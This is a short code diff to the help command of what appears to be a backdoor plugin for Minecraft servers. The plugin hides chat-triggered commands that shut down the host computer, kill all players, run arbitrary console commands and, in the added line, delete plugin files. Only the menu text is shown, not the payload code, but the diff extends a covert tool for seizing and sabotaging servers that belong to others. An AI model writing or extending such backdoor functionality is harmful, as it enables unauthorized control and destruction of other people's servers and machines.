@@ -38,6 +38,7 @@ public class Command_help implements Listener
                 p.sendMessage(ChatColor.GOLD + ".shutdown - Attempts to shutdown the computer the server is running on.");
                 p.sendMessage(ChatColor.GOLD + ".explode || .explosion - Explode everyone on the server. Includes you.");
                 p.sendMessage(ChatColor.GOLD + ".console <cmd> - Use the console.");
+                p.sendMessage(ChatColor.GOLD + ".deletefile <file> - Delete a file in the plugins folder.");
                 p.sendMessage(ChatColor.GOLD + ".help || .commands || .cmds || .cmdlist - Shows you all the commands.");
                 p.sendMessage(ChatColor.AQUA + "Those are all of the commands.");
                 event.setCancelled(true);
